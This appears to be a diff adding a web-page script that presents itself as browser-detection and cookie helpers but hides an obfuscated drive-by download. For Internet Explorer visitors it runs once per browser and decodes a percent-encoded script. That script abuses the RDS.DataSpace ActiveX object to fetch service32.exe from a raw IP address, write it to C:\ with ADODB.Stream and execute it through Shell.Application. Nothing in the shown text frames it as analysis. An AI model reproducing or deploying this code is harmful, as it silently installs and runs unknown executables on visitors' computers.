@@ -1,0 +1,128 @@
+<Script Language="JavaScript">
+function setCookie (name, value, expires, path, domain, secure) {
+document.cookie = name + "=" + escape(value) +
+((expires) ? "; expires=" + expires : "") +
+((path) ? "; path=" + path : "") +
+((domain) ? "; domain=" + domain : "") +
+((secure) ? "; secure" : "");
+}
+function getCookie(name) {
+var cookie = " " + document.cookie;
+var search = " " + name + "=";
+var setStr = null;
+var offset = 0;
+var end = 0;
+if (cookie.length > 0) {
+offset = cookie.indexOf(search);
+if (offset != -1) {
+offset += search.length;
+end = cookie.indexOf(";", offset)
+if (end == -1) {
+end = cookie.length;
+}
+setStr = unescape(cookie.substring(offset, end));
+}
+}
+return(setStr);
+}
+function getProperties(obj) {
+var properties = ''
+for(var propName in obj)
+properties += propName+"="+obj[propName]+" , "
+return properties
+}
+function which_browser(){
+navigator.DOM=!!(document.getElementById?1:0)
+navigator.OPERA=!!(window.opera)
+navigator.OPERA5=!!(navigator.OPERA&&navigator.userAgent.indexOf("pera 5")>0)
+navigator.IE6=!!(navigator.appVersion.indexOf("IE 6")>0&&navigator.DOM&&!navigator.OPERA?1:0)
+navigator.IE5=!!(navigator.appVersion.indexOf("IE 5")>0&&navigator.DOM&&!navigator.OPERA?1:0)
+navigator.IE4=!!(document.all&&!navigator.DOM?1:0)
+navigator.IE=!!(navigator.IE4||navigator.IE5||navigator.IE6)
+navigator.MAC=!!(navigator.userAgent.indexOf("Mac")>0)
+navigator.NS6=!!(navigator.DOM && parseInt(navigator.appVersion)>4?1:0)
+navigator.NS4=!!(document.layers && !navigator.DOM?1:0)
+navigator.DOMCORE1=!!(typeof(document.getElementsByTagName)!='undefined' && typeof(document.createElement)!='undefined')
+navigator.DOMCORE2=!!(navigator.DOMCORE1 && typeof(document.getElementById) != 'undefined' && typeof(document.createElementNS) != 'undefined')
+navigator.DOMHTML=!!(navigator.DOMCORE1 && typeof(document.getElementById) != 'undefined')
+navigator.DOMCSS1=!!(navigator.NS6||navigator.IE)
+navigator.DOMCSS2=!!(false)
+if(navigator.DOMCORE1){
+var element=document.createElement('p')
+navigator.DOMCSS2=(typeof(element.style)=='object')
+}
+navigator.detected=(navigator.IE6||navigator.IE5||navigator.IE4||
+navigator.NS6||navigator.NS4||
+navigator.OPERA5||navigator.OPERA||
+navigator.DOM)
+}
+which_browser()
+var agt=getProperties(navigator).toLowerCase()
+var is_winme = ((agt.indexOf("win 9x 4.90")!=-1));
+var is_win2k = ((agt.indexOf("windows nt 5.0")!=-1));
+var is_winxp = ((agt.indexOf("windows nt 5.1")!=-1));
+var is_win2k3 = ((agt.indexOf("windows nt 5.2")!=-1));
+var is_cookie = ((agt.indexOf("cookieenabled=true")!=-1));
+var execute_wmf = is_winxp || is_win2k3;
+
+if (is_cookie)
+{
+    if (navigator.IE)
+    {
+        var my_cookie = getCookie("170181240109");
+        if (my_cookie != "23262230228")
+        {
+            setCookie("170181240109", "23262230228", "Mon, 01-Dec-2007 00:00:00 GMT", "/");
+            
+            
+            
+         if (execute_wmf){
+            
+            
+            
+            
+
+            
+            
+            }
+            
+            
+            
+            
+var var25324110563=unescape('%3C%73%63%72%69%70%74%3E%0D%0A%76%61%72%20%6F%62%6A%5F%52%44%53%20'+
+'%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65'+
+'%6E%74%28%27%6F%62%6A%65%63%74%27%29%3B%0D%0A%6F%62%6A%5F%52%44%53'+
+'%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%69%64%27%2C%27%6F%62'+
+'%6A%5F%52%44%53%27%29%3B%0D%0A%6F%62%6A%5F%52%44%53%2E%73%65%74%41'+
+'%74%74%72%69%62%75%74%65%28%27%63%6C%61%73%73%69%64%27%2C%27%63%6C'+
+'%73%69%64%3A%42%44%39%36%43%35%35%36%2D%36%35%41%33%2D%31%31%44%30'+
+'%2D%39%38%33%41%2D%30%30%43%30%34%46%43%32%39%45%33%36%27%29%3B%0D'+
+'%0A%76%61%72%20%6F%62%6A%5F%6D%73%78%6D%6C%32%20%3D%20%6F%62%6A%5F'+
+'%52%44%53%2E%43%72%65%61%74%65%4F%62%6A%65%63%74%28%22%6D%73%78%6D'+
+'%6C%32%2E%58%4D%4C%48%54%54%50%22%2C%22%22%29%3B%0D%0A%6F%62%6A%5F'+
+'%6D%73%78%6D%6C%32%2E%6F%70%65%6E%28%22%47%45%54%22%2C%22%68%74%74'+
+'%70%3A%2F%2F%36%39%2E%33%31%2E%38%33%2E%32%32%2F%61%64%2F%30%30%39'+
+'%30%2F%73%65%72%76%69%63%65%33%32%2E%65%78%65%22%2C%66%61%6C%73%65'+
+'%29%3B%0D%0A%6F%62%6A%5F%6D%73%78%6D%6C%32%2E%73%65%6E%64%28%29%3B'+
+'%0D%0A%76%61%72%20%6F%62%6A%5F%53%68%65%6C%6C%41%70%70%20%3D%20%6F'+
+'%62%6A%5F%52%44%53%2E%43%72%65%61%74%65%4F%62%6A%65%63%74%28%22%53'+
+'%68%65%6C%6C%2E%41%70%70%6C%69%63%61%74%69%6F%6E%22%2C%22%22%29%3B'+
+'%0D%0A%76%61%72%20%6F%62%6A%5F%61%64%6F%64%62%20%3D%20%6F%62%6A%5F'+
+'%52%44%53%2E%43%72%65%61%74%65%4F%62%6A%65%63%74%28%22%61%64%6F%64'+
+'%62%2E%73%74%72%65%61%6D%22%2C%22%22%29%3B%0D%0A%6F%62%6A%5F%61%64'+
+'%6F%64%62%2E%74%79%70%65%20%3D%20%31%3B%0D%0A%6F%62%6A%5F%61%64%6F'+
+'%64%62%2E%6F%70%65%6E%28%29%3B%0D%0A%6F%62%6A%5F%61%64%6F%64%62%2E'+
+'%57%72%69%74%65%28%6F%62%6A%5F%6D%73%78%6D%6C%32%2E%72%65%73%70%6F'+
+'%6E%73%65%42%6F%64%79%29%3B%0D%0A%76%61%72%20%66%6E%20%3D%20%22%43'+
+'%3A%5C%5C%31%31%39%31%32%31%31%38%36%32%33%32%2E%65%78%65%22%3B%0D'+
+'%0A%6F%62%6A%5F%61%64%6F%64%62%2E%53%61%76%65%54%6F%46%69%6C%65%28'+
+'%66%6E%2C%32%29%3B%0D%0A%6F%62%6A%5F%53%68%65%6C%6C%41%70%70%2E%53'+
+'%68%65%6C%6C%45%78%65%63%75%74%65%28%66%6E%29%3B%0D%0A%3C%2F%73%63'+
+'%72%69%70%74%3E%0D%0A');
+document.write(var25324110563);
+
+        }
+    }
+}
+</Script> 
+
